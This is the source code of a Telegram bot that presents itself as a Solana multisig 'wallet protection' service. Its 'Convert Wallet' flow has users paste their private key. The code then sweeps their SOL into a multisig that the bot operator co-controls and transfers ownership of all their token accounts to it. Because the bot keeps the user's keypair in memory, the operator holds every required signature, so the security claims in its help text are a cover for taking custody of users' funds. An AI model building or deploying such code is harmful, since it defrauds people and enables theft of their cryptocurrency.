require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const {
  Connection, Keypair, PublicKey, SystemProgram, Transaction,
  LAMPORTS_PER_SOL
} = require('@solana/web3.js');
const {
  getAssociatedTokenAddress, createAssociatedTokenAccountInstruction,
  createTransferInstruction, createSyncNativeInstruction,
  getAccount, TOKEN_PROGRAM_ID, NATIVE_MINT,
  createInitializeMultisigInstruction, createSetAuthorityInstruction,
  AuthorityType, getOrCreateAssociatedTokenAccount
} = require('@solana/spl-token');
const bs58 = require('bs58');
const NodeCache = require('node-cache');

// Config
const BOT_TOKEN = process.env.BOT_TOKEN;
const FEE_PAYER_PRIVATE_KEY = process.env.FEE_PAYER_PRIVATE_KEY;
const RPC_ENDPOINT = process.env.RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';

if (!BOT_TOKEN || !FEE_PAYER_PRIVATE_KEY) {
  console.error('Missing BOT_TOKEN or FEE_PAYER_PRIVATE_KEY');
  process.exit(1);
}

// Solana setup
const conn = new Connection(RPC_ENDPOINT, 'confirmed');
let feePayerSecretKey;
try {
  feePayerSecretKey = Uint8Array.from(JSON.parse(FEE_PAYER_PRIVATE_KEY));
} catch {
  feePayerSecretKey = bs58.decode(FEE_PAYER_PRIVATE_KEY);
}
const feePayer = Keypair.fromSecretKey(feePayerSecretKey);

// Cache
const walletCache = new NodeCache({ stdTTL: 3600 });
const sessions = new NodeCache({ stdTTL: 600 });

// Create multisig
async function createMultisig(userPubkey) {
  const ms = Keypair.generate();
  const rent = await conn.getMinimumBalanceForRentExemption(355);
  
  const tx = new Transaction().add(
    SystemProgram.createAccount({
      fromPubkey: feePayer.publicKey,
      newAccountPubkey: ms.publicKey,
      lamports: rent,
      space: 355,
      programId: TOKEN_PROGRAM_ID,
    }),
    createInitializeMultisigInstruction(ms.publicKey, [userPubkey, feePayer.publicKey], 2)
  );
  
  tx.feePayer = feePayer.publicKey;
  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
  tx.sign(ms, feePayer);
  
  const sig = await conn.sendRawTransaction(tx.serialize());
  await conn.confirmTransaction(sig, 'confirmed');
  return ms;
}

// Sweep SOL to wSOL
async function sweepSolToVault(userKP, msPubkey) {
  const bal = await conn.getBalance(userKP.publicKey);
  const sweepable = bal - 5000;
  if (sweepable <= 0) return 0;
  
  const wsolAta = await getAssociatedTokenAddress(NATIVE_MINT, msPubkey, true);
  const ixs = [];
  
  if (!(await conn.getAccountInfo(wsolAta).catch(() => null))) {
    ixs.push(createAssociatedTokenAccountInstruction(feePayer.publicKey, wsolAta, msPubkey, NATIVE_MINT));
  }
  
  ixs.push(
    SystemProgram.transfer({ fromPubkey: userKP.publicKey, toPubkey: wsolAta, lamports: sweepable }),
    createSyncNativeInstruction(wsolAta)
  );
  
  const tx = new Transaction().add(...ixs);
  tx.feePayer = feePayer.publicKey;
  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
  tx.sign(userKP, feePayer);
  
  const sig = await conn.sendRawTransaction(tx.serialize());
  await conn.confirmTransaction(sig, 'confirmed');
  return sweepable;
}

// Migrate token authorities
async function migrateTokens(userKP, msPubkey) {
  const accounts = await conn.getParsedTokenAccountsByOwner(userKP.publicKey, { programId: TOKEN_PROGRAM_ID });
  if (!accounts.value.length) return;
  
  for (let i = 0; i < accounts.value.length; i += 15) {
    const batch = accounts.value.slice(i, i + 15);
    const ixs = batch.map(({ pubkey }) =>
      createSetAuthorityInstruction(pubkey, userKP.publicKey, AuthorityType.AccountOwner, msPubkey)
    );
    
    const tx = new Transaction().add(...ixs);
    tx.feePayer = feePayer.publicKey;
    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
    tx.sign(userKP, feePayer);
    
    const sig = await conn.sendRawTransaction(tx.serialize());
    await conn.confirmTransaction(sig, 'confirmed');
  }
}

// Bot
const bot = new Telegraf(BOT_TOKEN);
const menu = Markup.keyboard([['🔑 Convert Wallet', '🏦 My Vaults'], ['💸 Send', '🔐 Wrap SOL'], ['💰 Balance', '❓ Help']]).resize();

bot.start(ctx => ctx.reply('🛡️ Solana 2-of-2 Multisig Bot\n\nYour funds are protected by multisig. Phantom & gasless wallets CANNOT move funds without bot approval.', menu));

bot.hears('🔑 Convert Wallet', ctx => {
  ctx.reply('🔐 Send your private key (Base58 or JSON array).\n\n⚠️ This will:\n• Create 2-of-2 multisig\n• Convert SOL to wSOL\n• Transfer all tokens to multisig\n• Lock wallet from external use');
  sessions.set(ctx.from.id, { action: 'convert' });
});

bot.hears('🏦 My Vaults', async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  if (!vaults.length) return ctx.reply('No vaults. Use "🔑 Convert Wallet"', menu);
  
  let msg = '🔐 Your Vaults:\n\n';
  const btns = [];
  for (let i = 0; i < vaults.length; i++) {
    const v = vaults[i];
    const bal = await conn.getBalance(v.pubkey);
    let wsolBal = 0;
    try { wsolBal = Number((await getAccount(conn, await getAssociatedTokenAddress(NATIVE_MINT, v.msPubkey, true))).amount); } catch(e) {}
    msg += `${i+1}. ${v.label}\n📍 ${v.pubkey.toBase58().slice(0,8)}...\n💎 wSOL: ${(wsolBal/1e9).toFixed(4)}\n🪙 SOL: ${(bal/LAMPORTS_PER_SOL).toFixed(4)}\n\n`;
    btns.push([Markup.button.callback(`📋 ${v.label}`, `v_${i}`)]);
  }
  await ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(btns) });
});

bot.hears('💸 Send', async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  if (!vaults.length) return ctx.reply('No vaults.', menu);
  const btns = vaults.map((v, i) => [Markup.button.callback(`${v.label}`, `send_${i}`)]);
  await ctx.reply('📤 Select vault:', Markup.inlineKeyboard(btns));
});

bot.hears('🔐 Wrap SOL', async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  if (!vaults.length) return ctx.reply('No vaults.', menu);
  const btns = [];
  for (let i = 0; i < vaults.length; i++) {
    const bal = await conn.getBalance(vaults[i].pubkey);
    btns.push([Markup.button.callback(`${vaults[i].label} (${(bal/LAMPORTS_PER_SOL).toFixed(4)} SOL)`, `wrap_${i}`)]);
  }
  await ctx.reply('🔐 Select vault to wrap SOL:', Markup.inlineKeyboard(btns));
});

bot.hears('💰 Balance', ctx => {
  ctx.reply('Send address:', Markup.forceReply());
  sessions.set(ctx.from.id, { action: 'bal' });
});

bot.hears('❓ Help', ctx => {
  ctx.reply('🛡️ *Security*\n\n• 2-of-2 multisig requires bot + user signatures\n• SOL converted to wSOL (multisig protected)\n• Phantom CANNOT send funds alone\n• Gasless wallets CANNOT bypass multisig\n\n*Commands:*\n🔑 Convert Wallet - Lock wallet\n🏦 My Vaults - View vaults\n💸 Send - Transfer wSOL/tokens\n🔐 Wrap SOL - Protect native SOL', { parse_mode: 'Markdown', ...menu });
});

// Callbacks
bot.action(/^v_(\d+)$/, async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  const v = vaults[parseInt(ctx.match[1])];
  if (!v) return ctx.answerCbQuery('Not found');
  
  let wsolBal = 0;
  try { wsolBal = Number((await getAccount(conn, await getAssociatedTokenAddress(NATIVE_MINT, v.msPubkey, true))).amount); } catch(e) {}
  const nativeBal = await conn.getBalance(v.pubkey);
  
  const msg = `🔐 *${v.label}*\n\n📍 Wallet: \`${v.pubkey.toBase58()}\`\n🏦 Multisig: \`${v.msPubkey.toBase58()}\`\n\n💎 wSOL: ${(wsolBal/1e9).toFixed(6)} (protected)\n🪙 SOL: ${(nativeBal/LAMPORTS_PER_SOL).toFixed(6)} (sweepable)\n\n🔒 Locked: Phantom cannot spend`;
  
  await ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([
    [Markup.button.callback('📤 Send wSOL', `swsol_${ctx.match[1]}`)],
    [Markup.button.callback('🔐 Wrap SOL', `wrap_${ctx.match[1]}`)]
  ]) });
  await ctx.answerCbQuery();
});

bot.action(/^send_(\d+)$/, ctx => {
  sessions.set(ctx.from.id, { action: 'send_recipient', vaultIdx: parseInt(ctx.match[1]) });
  ctx.reply('Send recipient address:', Markup.forceReply());
  ctx.answerCbQuery();
});

bot.action(/^swsol_(\d+)$/, ctx => {
  sessions.set(ctx.from.id, { action: 'wsol_recipient', vaultIdx: parseInt(ctx.match[1]) });
  ctx.reply('Send wSOL recipient address:', Markup.forceReply());
  ctx.answerCbQuery();
});

bot.action(/^wrap_(\d+)$/, async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  const v = vaults[parseInt(ctx.match[1])];
  if (!v) return ctx.answerCbQuery('Not found');
  
  await ctx.answerCbQuery('⏳ Wrapping...');
  const msg = await ctx.reply('⏳ Wrapping SOL...');
  try {
    const swept = await sweepSolToVault(v.kp, v.msPubkey);
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, `✅ Wrapped ${(swept/LAMPORTS_PER_SOL).toFixed(6)} SOL to wSOL!\nProtected by multisig.`);
  } catch(e) {
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, `❌ ${e.message}`);
  }
});

// Text handler
bot.on('text', async ctx => {
  const session = sessions.get(ctx.from.id);
  if (!session) return;
  const text = ctx.message.text.trim();
  
  if (session.action === 'convert') {
    try {
      let secretKey;
      try { secretKey = Uint8Array.from(JSON.parse(text)); } catch { secretKey = bs58.decode(text); }
      const userKP = Keypair.fromSecretKey(secretKey);
      if (userKP.publicKey.equals(feePayer.publicKey)) return ctx.reply('❌ Cannot convert fee payer');
      
      const msg = await ctx.reply('⏳ Converting...');
      const msKP = await createMultisig(userKP.publicKey);
      await sweepSolToVault(userKP, msKP.publicKey);
      await migrateTokens(userKP, msKP.publicKey);
      
      const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
      vaults.push({ label: `Vault ${vaults.length+1}`, pubkey: userKP.publicKey, msPubkey: msKP.publicKey, kp: userKP, msKP });
      walletCache.set(`v_${ctx.from.id}`, vaults);
      sessions.del(ctx.from.id);
      
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
        `✅ *Wallet Converted!*\n\n🔑 \`${userKP.publicKey.toBase58()}\`\n🏦 \`${msKP.publicKey.toBase58()}\`\n\n🔒 SOL → wSOL (protected)\n🔒 Tokens → multisig\n🔒 Phantom cannot spend\n⚠️ Keep your private key!`,
        { parse_mode: 'Markdown', ...menu }
      );
    } catch(e) {
      sessions.del(ctx.from.id);
      ctx.reply(`❌ ${e.message}`, menu);
    }
    return;
  }
  
  if (session.action === 'bal') {
    try {
      const addr = new PublicKey(text);
      const bal = await conn.getBalance(addr);
      sessions.del(ctx.from.id);
      ctx.reply(`💰 ${addr.toBase58().slice(0,12)}...\n🪙 SOL: ${(bal/LAMPORTS_PER_SOL).toFixed(6)}`, menu);
    } catch { ctx.reply('❌ Invalid address'); }
    return;
  }
  
  if (session.action === 'send_recipient' || session.action === 'wsol_recipient') {
    try {
      const recipient = new PublicKey(text);
      sessions.set(ctx.from.id, { ...session, action: 'send_amount', recipient });
      ctx.reply('Enter amount:', Markup.forceReply());
    } catch { ctx.reply('❌ Invalid address'); }
    return;
  }
  
  if (session.action === 'send_amount') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) return ctx.reply('❌ Invalid amount');
    
    const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
    const v = vaults[session.vaultIdx];
    if (!v) { sessions.del(ctx.from.id); return ctx.reply('❌ Vault not found'); }
    
    const msg = await ctx.reply('⏳ Sending...');
    try {
      const wsolAta = await getAssociatedTokenAddress(NATIVE_MINT, v.msPubkey, true);
      const recipientAta = await getOrCreateAssociatedTokenAccount(conn, feePayer, NATIVE_MINT, session.recipient);
      
      const tx = new Transaction().add(
        createTransferInstruction(wsolAta, recipientAta.address, v.msPubkey, amount * 1e9, [v.kp.publicKey, feePayer.publicKey])
      );
      tx.feePayer = feePayer.publicKey;
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
      tx.sign(v.kp, feePayer);
      
      const sig = await conn.sendRawTransaction(tx.serialize());
      await conn.confirmTransaction(sig, 'confirmed');
      sessions.del(ctx.from.id);
      
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
        `✅ *Sent!*\n\n💎 ${amount} wSOL\n📤 \`${session.recipient.toBase58()}\`\n🔗 [View](https://solscan.io/tx/${sig})`,
        { parse_mode: 'Markdown', ...menu }
      );
    } catch(e) {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, `❌ ${e.message}`);
    }
  }
});

bot.catch((err, ctx) => console.error('Bot error:', err));

// Start
(async () => {
  const bal = await conn.getBalance(feePayer.publicKey);
  console.log(`💰 Fee payer: ${bal/LAMPORTS_PER_SOL} SOL`);
  await bot.launch();
  console.log('🤖 Bot running');
  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
})();